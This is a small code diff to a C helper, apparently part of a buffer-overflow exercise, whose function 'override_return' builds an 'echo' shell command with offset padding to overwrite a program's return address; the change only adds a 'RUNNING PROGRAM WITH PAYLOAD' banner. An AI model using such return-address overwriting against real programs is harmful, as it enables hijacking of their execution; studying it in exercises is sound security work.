@@ -4,7 +4,7 @@
 
 void override_return(char* prgrm, int address, int offset){
 	/*printf("override return received: %s, %s, %d\n", prgrm, address, offset);*/
-
+	printf("RUNNING PROGRAM WITH PAYLOAD\n=========================================\n\n");
 	int len = strlen(prgrm);
 	char cmd[10000] = "echo ";
 	for (int i = 0; i < offset; i++) {
